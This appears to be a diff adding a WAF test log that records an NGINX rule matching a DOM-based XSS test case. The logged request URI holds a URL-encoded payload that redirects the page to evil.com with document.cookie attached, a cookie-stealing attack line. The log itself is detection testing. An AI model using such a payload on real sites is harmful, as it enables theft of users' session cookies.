@@ -1,0 +1,3 @@
+Expected Rule: [NGINX XSS] DOM-based XSS Attack
+Matched Rule: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1768205842788-lxov9k pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
+Rule Match: ✅ Match
